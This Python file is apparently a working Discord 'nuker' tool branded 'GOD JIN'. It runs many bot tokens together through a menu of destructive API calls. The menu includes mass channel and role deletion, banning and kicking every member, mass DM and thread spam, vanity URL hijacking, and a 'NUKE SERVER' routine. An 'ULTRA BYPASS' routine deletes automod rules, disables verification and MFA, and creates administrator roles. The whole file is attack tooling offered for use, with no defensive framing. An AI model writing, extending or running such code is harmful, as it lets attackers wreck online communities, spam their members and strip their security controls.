import urllib.request
import urllib.error
import json
import sys
import re

# Discord API base URL
API_BASE = "https://discord.com/api/v10"

# Import ALL tokens from slave-bots.py
try:
    with open("slave-bots.py", "r") as f:
        content = f.read()
        TOKENS = re.findall(r'"([^"]*)"', content)
        TOKENS = [t for t in TOKENS if t not in ["TOKEN_1", "TOKEN_2", "TOKEN_3"]]
except:
    TOKENS = []

# Import client IDs from client-id.py
try:
    with open("client-id.py", "r") as f:
        content = f.read()
        CLIENT_IDS = re.findall(r'"([^"]*)"', content)
        CLIENT_IDS = [c for c in CLIENT_IDS if "ID" not in c]
except:
    CLIENT_IDS = []

def request(url, method="GET", data=None, token=None):
    if not token: return None
    headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json", "User-Agent": "BotController/1.0"}
    if data: data = json.dumps(data).encode('utf-8')
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req) as response:
            if response.status == 204: return True
            return json.loads(response.read().decode())
    except: return None

def multi_request(url, method="GET", data=None):
    """Executes request across all active tokens"""
    res = None
    for token in TOKENS:
        try:
            r = request(url, method, data, token)
            if r: res = r
        except: continue
    return res

def get_guild_selection():
    guilds = request(f"{API_BASE}/users/@me/guilds", token=TOKENS[0])
    if not guilds:
        print("\033[91mNo servers found!\033[0m")
        return None
    print("\nSelect a Server:")
    for i, g in enumerate(guilds, 1):
        print(f"{i}. {g['name']} ({g['id']})")
    
    try:
        choice = int(input("\nEnter selection number: "))
        if 1 <= choice <= len(guilds):
            return guilds[choice-1]['id']
    except:
        pass
    print("\033[91mInvalid selection.\033[0m")
    return None

def main():
    print("\033[91m")
    print(r"""
   _______  _______  ______         ___  _____  __   _
  |  |  | |  |  | |   _  \       |   |   |   |  \  |
  |  |  | |  |  | |  |  \  \      |   |   |   |   \ |
  |  |  | |  |  | |  |   |  |     |   |   |   |    \|
  |__|__| |__|__| |__|__/  /  \___/   |___|   |__|\_|
    """)
    print("      === GOD JIN ===      ")
    print("\033[0m")
    
    if not TOKENS:
        print("\033[91mNo tokens found in slave-bots.py!\033[0m")
        manual_token = input("\nEnter a Bot Token to use: ").strip()
        if not manual_token: return
        TOKENS.append(manual_token)
    
    user = request(f"{API_BASE}/users/@me", token=TOKENS[0])
    if not user:
        print("\033[91mFailed to verify tokens. Check slave-bots.py\033[0m")
        return
        
    print(f"✅ Active Bots: {len(TOKENS)}")
    print(f"👤 Primary Bot: {user['username']}#{user['discriminator']}")
    
    print("\033[91m")
    print(r"""
███████████████████████████
███████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄██████████
███████████████████████████
    """)
    print("\033[0m")
    
    while True:
        print("\033[91m")
        print("--------------------------------------------------------------------------------")
        print("1. List Servers        11. Delete Stickers     21. Thread Spam")
        print("2. Delete Channels     12. Prune Members       22. Strip Perms")
        print("3. Ban Members         13. Create Webhooks     23. System Cleanup")
        print("4. Kick Members        14. Delete Webhooks     24. Strip Owner Nicks")
        print("5. Create Channels     15. Mass Message        25. Lock Server")
        print("6. Create Roles        16. Change Nickname     26. Delete Roles (All)")
        print("7. Delete Roles        17. Invite All Bots     27. Reaction Spam")
        print("8. Rename Guild        18. NUKE SERVER         28. Hide Discovery")
        print("9. Spam Channels       19. Disable Community   29. Vanity Hijack")
        print("10. Delete Emojis      20. Prune (30 Days)      30. ULTRA BYPASS")
        print("                                               31. Exit")
        print("--------------------------------------------------------------------------------")
        print("\033[0m")
        
        choice = input("Select option [1-31]: ").strip()
        if choice == "31": break
        
        if choice == "1":
            guilds = request(f"{API_BASE}/users/@me/guilds", token=TOKENS[0])
            if guilds:
                for g in guilds: print(f"- {g['name']} (ID: {g['id']})")
        
        elif choice == "2":
            guild_id = get_guild_selection()
            if not guild_id: continue
            channels = request(f"{API_BASE}/guilds/{guild_id}/channels", token=TOKENS[0])
            if channels:
                for c in channels: multi_request(f"{API_BASE}/channels/{c['id']}", method="DELETE")
                print("\033[92m✅ Channels deleted.\033[0m")

        elif choice == "3":
            guild_id = get_guild_selection()
            if not guild_id: continue
            members = request(f"{API_BASE}/guilds/{guild_id}/members?limit=1000", token=TOKENS[0])
            if members:
                for m in members: multi_request(f"{API_BASE}/guilds/{guild_id}/bans/{m['user']['id']}", method="PUT")
                print("\033[92m✅ Members banned.\033[0m")

        elif choice == "4":
            guild_id = get_guild_selection()
            if not guild_id: continue
            members = request(f"{API_BASE}/guilds/{guild_id}/members?limit=1000", token=TOKENS[0])
            if members:
                for m in members: multi_request(f"{API_BASE}/guilds/{guild_id}/members/{m['user']['id']}", method="DELETE")
                print("\033[92m✅ Members kicked.\033[0m")

        elif choice == "5":
            guild_id = get_guild_selection()
            if not guild_id: continue
            name = input("Channel name: ").strip()
            print("Types: 0=Text, 2=Voice, 4=Category")
            c_type = input("Type [0/2/4]: ").strip()
            try:
                c_type = int(c_type)
            except:
                c_type = 0
            amount = input("Amount to create: ").strip()
            try:
                amount = int(amount)
            except:
                amount = 1
            for i in range(amount): multi_request(f"{API_BASE}/guilds/{guild_id}/channels", method="POST", data={"name": name, "type": c_type})
            print(f"\033[92m✅ {amount} channels created.\033[0m")

        elif choice == "6":
            guild_id = get_guild_selection()
            if not guild_id: continue
            name = input("Role name: ").strip()
            for i in range(50): multi_request(f"{API_BASE}/guilds/{guild_id}/roles", method="POST", data={"name": name})
            print("\033[92m✅ Roles created.\033[0m")

        elif choice == "7":
            guild_id = get_guild_selection()
            if not guild_id: continue
            roles = request(f"{API_BASE}/guilds/{guild_id}/roles", token=TOKENS[0])
            if roles:
                for r in roles:
                    if not r.get('managed') and r['name'] != '@everyone': multi_request(f"{API_BASE}/guilds/{guild_id}/roles/{r['id']}", method="DELETE")
                print("\033[92m✅ Roles deleted.\033[0m")

        elif choice == "8":
            guild_id = get_guild_selection()
            if not guild_id: continue
            name = input("New name: ").strip()
            multi_request(f"{API_BASE}/guilds/{guild_id}", method="PATCH", data={"name": name})
            print("\033[92m✅ Guild renamed.\033[0m")

        elif choice == "9":
            guild_id = get_guild_selection()
            if not guild_id: continue
            msg = input("Message: ").strip()
            channels = request(f"{API_BASE}/guilds/{guild_id}/channels", token=TOKENS[0])
            if channels:
                for c in [ch for ch in channels if ch['type'] == 0]: multi_request(f"{API_BASE}/channels/{c['id']}/messages", method="POST", data={"content": msg})
                print("\033[92m✅ Spam finished.\033[0m")

        elif choice == "10":
            guild_id = get_guild_selection()
            if not guild_id: continue
            emojis = request(f"{API_BASE}/guilds/{guild_id}/emojis", token=TOKENS[0])
            if emojis:
                for e in emojis: multi_request(f"{API_BASE}/guilds/{guild_id}/emojis/{e['id']}", method="DELETE")
                print("\033[92m✅ Emojis deleted.\033[0m")

        elif choice == "11":
            guild_id = get_guild_selection()
            if not guild_id: continue
            stickers = request(f"{API_BASE}/guilds/{guild_id}/stickers", token=TOKENS[0])
            if stickers:
                for s in stickers: multi_request(f"{API_BASE}/guilds/{guild_id}/stickers/{s['id']}", method="DELETE")
                print("\033[92m✅ Stickers deleted.\033[0m")

        elif choice == "12":
            guild_id = get_guild_selection()
            if not guild_id: continue
            multi_request(f"{API_BASE}/guilds/{guild_id}/prune", method="POST", data={"days": 7})
            print("\033[92m✅ Prune finished.\033[0m")

        elif choice == "13":
            guild_id = get_guild_selection()
            if not guild_id: continue
            channels = request(f"{API_BASE}/guilds/{guild_id}/channels", token=TOKENS[0])
            if channels:
                tc = [c for c in channels if c['type'] == 0]
                if tc:
                    for i in range(50): multi_request(f"{API_BASE}/channels/{tc[i%len(tc)]['id']}/webhooks", method="POST", data={"name": "GOD JIN"})
                print("\033[92m✅ Webhooks created.\033[0m")

        elif choice == "14":
            guild_id = get_guild_selection()
            if not guild_id: continue
            webhooks = request(f"{API_BASE}/guilds/{guild_id}/webhooks", token=TOKENS[0])
            if webhooks:
                for w in webhooks: multi_request(f"{API_BASE}/webhooks/{w['id']}", method="DELETE")
                print("\033[92m✅ Webhooks deleted.\033[0m")

        elif choice == "15":
            guild_id = get_guild_selection()
            if not guild_id: continue
            msg = input("Message: ").strip()
            members = request(f"{API_BASE}/guilds/{guild_id}/members?limit=1000", token=TOKENS[0])
            if members:
                for m in members:
                    dm = request(f"{API_BASE}/users/@me/channels", method="POST", data={"recipient_id": m['user']['id']}, token=TOKENS[0])
                    if dm: multi_request(f"{API_BASE}/channels/{dm['id']}/messages", method="POST", data={"content": msg})
                print("\033[92m✅ Mass DM finished.\033[0m")

        elif choice == "16":
            guild_id = get_guild_selection()
            if not guild_id: continue
            nick = input("New nickname: ").strip()
            members = request(f"{API_BASE}/guilds/{guild_id}/members?limit=1000", token=TOKENS[0])
            if members:
                for m in members: multi_request(f"{API_BASE}/guilds/{guild_id}/members/{m['user']['id']}", method="PATCH", data={"nick": nick})
                print("\033[92m✅ Nicknames updated.\033[0m")

        elif choice == "17":
            print("\nGenerating invite links...")
            for i, b_id in enumerate(CLIENT_IDS): print(f"Bot {i+1}: https://discord.com/api/oauth2/authorize?client_id={b_id}&permissions=8&scope=bot")

        elif choice == "18":
            guild_id = get_guild_selection()
            if not guild_id: continue
            if input("Type 'NUKE' to confirm: ").strip() != "NUKE": continue
            multi_request(f"{API_BASE}/guilds/{guild_id}", method="PATCH", data={"name": "DESTROYED BY GOD JIN", "verification_level": 4})
            channels = request(f"{API_BASE}/guilds/{guild_id}/channels", token=TOKENS[0])
            if channels:
                for c in channels: multi_request(f"{API_BASE}/channels/{c['id']}", method="DELETE")
            for i in range(50): multi_request(f"{API_BASE}/guilds/{guild_id}/channels", method="POST", data={"name": "trashed-by-god-jin", "type": 0})
            members = request(f"{API_BASE}/guilds/@me/members?limit=1000", token=TOKENS[0])
            if members:
                for m in members: multi_request(f"{API_BASE}/guilds/{guild_id}/bans/{m['user']['id']}", method="PUT", data={"delete_message_days": 7})
            print("\033[92m✅ Nuke complete.\033[0m")

        elif choice == "19":
            guild_id = get_guild_selection()
            if not guild_id: continue
            multi_request(f"{API_BASE}/guilds/{guild_id}", method="PATCH", data={"features": []})
            print("\033[92m✅ Community disabled.\033[0m")

        elif choice == "20":
            guild_id = get_guild_selection()
            if not guild_id: continue
            multi_request(f"{API_BASE}/guilds/{guild_id}/prune", method="POST", data={"days": 30})
            print("\033[92m✅ Max prune initiated.\033[0m")

        elif choice == "21":
            guild_id = get_guild_selection()
            if not guild_id: continue
            channels = request(f"{API_BASE}/guilds/{guild_id}/channels", token=TOKENS[0])
            if channels:
                for c in [ch for ch in channels if ch['type'] == 0]: multi_request(f"{API_BASE}/channels/{c['id']}/threads", method="POST", data={"name": "GOD JIN WAS HERE", "type": 11})
                print("\033[92m✅ Thread spam finished.\033[0m")

        elif choice == "22":
            guild_id = get_guild_selection()
            if not guild_id: continue
            roles = request(f"{API_BASE}/guilds/{guild_id}/roles", token=TOKENS[0])
            if roles:
                for r in roles:
                    if r['name'] == '@everyone': multi_request(f"{API_BASE}/guilds/{guild_id}/roles/{r['id']}", method="PATCH", data={"permissions": "0"})
                print("\033[92m✅ Permissions stripped.\033[0m")

        elif choice == "23":
            guild_id = get_guild_selection()
            if not guild_id: continue
            multi_request(f"{API_BASE}/guilds/{guild_id}/welcome-screen", method="PATCH", data={"enabled": False})
            multi_request(f"{API_BASE}/guilds/{guild_id}/vanity-url", method="PATCH", data={"code": "godjin-nuked"})
            print("\033[92m✅ System cleanup finished.\033[0m")

        elif choice == "24":
            guild_id = get_guild_selection()
            if not guild_id: continue
            members = request(f"{API_BASE}/guilds/{guild_id}/members?limit=1000", token=TOKENS[0])
            if members:
                for m in members: multi_request(f"{API_BASE}/guilds/{guild_id}/members/{m['user']['id']}", method="PATCH", data={"nick": "GOD JIN SLAVE"})
                print("\033[92m✅ Owner nicks stripped.\033[0m")

        elif choice == "25":
            guild_id = get_guild_selection()
            if not guild_id: continue
            multi_request(f"{API_BASE}/guilds/{guild_id}", method="PATCH", data={"verification_level": 4})
            print("\033[92m✅ Server locked.\033[0m")

        elif choice == "26":
            guild_id = get_guild_selection()
            if not guild_id: continue
            roles = request(f"{API_BASE}/guilds/{guild_id}/roles", token=TOKENS[0])
            if roles:
                for r in roles:
                    if not r.get('managed'): multi_request(f"{API_BASE}/guilds/{guild_id}/roles/{r['id']}", method="DELETE")
            print("\033[92m✅ Roles purged.\033[0m")

        elif choice == "27":
            guild_id = get_guild_selection()
            if not guild_id: continue
            channels = request(f"{API_BASE}/guilds/{guild_id}/channels", token=TOKENS[0])
            if channels:
                for c in [ch for ch in channels if ch['type'] == 0]:
                    msgs = request(f"{API_BASE}/channels/{c['id']}/messages?limit=5", token=TOKENS[0])
                    if msgs:
                        for m in msgs: multi_request(f"{API_BASE}/channels/{c['id']}/messages/{m['id']}/reactions/%F0%9F%96%95/@me", method="PUT")
            print("\033[92m✅ Reaction spam finished.\033[0m")

        elif choice == "28":
            guild_id = get_guild_selection()
            if not guild_id: continue
            multi_request(f"{API_BASE}/guilds/{guild_id}", method="PATCH", data={"discovery_enabled": False})
            print("\033[92m✅ Discovery hidden.\033[0m")

        elif choice == "29":
            guild_id = get_guild_selection()
            if not guild_id: continue
            code = input("New vanity code: ").strip()
            multi_request(f"{API_BASE}/guilds/{guild_id}/vanity-url", method="PATCH", data={"code": code})
            print("\033[92m✅ Vanity hijacked.\033[0m")

        elif choice == "30":
            guild_id = get_guild_selection()
            if not guild_id: continue
            if input("Type 'BYPASS' to confirm: ").strip() != "BYPASS": continue
            print("\n🚀 INITIATING ULTRA BYPASS SEQUENCE...")
            rules = request(f"{API_BASE}/guilds/{guild_id}/auto-moderation/rules", token=TOKENS[0])
            if rules:
                for r in rules: multi_request(f"{API_BASE}/guilds/{guild_id}/auto-moderation/rules/{r['id']}", method="DELETE")
            multi_request(f"{API_BASE}/guilds/{guild_id}", method="PATCH", data={
                "verification_level": 0,
                "explicit_content_filter": 0,
                "default_message_notifications": 0,
                "mfa_level": 0
            })
            for i in range(5):
                multi_request(f"{API_BASE}/guilds/{guild_id}/roles", method="POST", data={"name": "GOD JIN BYPASS", "permissions": "8"})
            print("\033[92m✅ ULTRA BYPASS COMPLETE. Server security is zero.\033[0m")

if __name__ == "__main__":
    main()
